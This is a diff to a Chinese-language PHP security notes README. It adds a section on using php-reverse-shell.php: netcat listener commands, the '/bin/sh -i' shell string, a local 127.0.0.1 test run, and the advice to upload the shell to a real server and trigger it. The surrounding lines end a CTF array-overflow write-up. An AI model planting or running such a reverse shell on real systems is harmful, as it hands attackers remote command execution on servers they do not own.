@@ -69,3 +69,35 @@ http://localhost/test.php?user[1]=password&user[4294967296]=admin
 所有条件均符合，flag获得，如下图：
 ```
 ![](https://github.com/LockGit/PHP/blob/master/ctf.jpeg)
+
+
+### php-reverse-shell.php 一个反弹shell的php程序
+```
+终端1：
+Mac环境：
+➜  ~ nc -l -v -n 0 1234
+
+Linux：
+nc -v -n -l -p 1234
+
+
+终端2：
+---
+注释：
+$shell = 'uname -a; w; id; /bin/sh -i';
+man sh
+-i        If the -i option is present, the shell is interactive.
+忘记了这个参数的作用了，sh -i 是激活交互的方式
+---
+
+执行：
+	php php-reverse-shell.php
+现实环境中上传shell后，访问让其运行即可
+程序会fork一个子进程，并尝试连接某个ip的某个端口
+测试时用的是本地的127.0.0.1 1234端口
+➜  ~ php php-reverse-shell.php
+Successfully opened reverse shell to 127.0.0.1:1234
+➜  ~
+
+此时终端1立即获得一个shell的交互界面，尝试去任意命运执行吧
+```
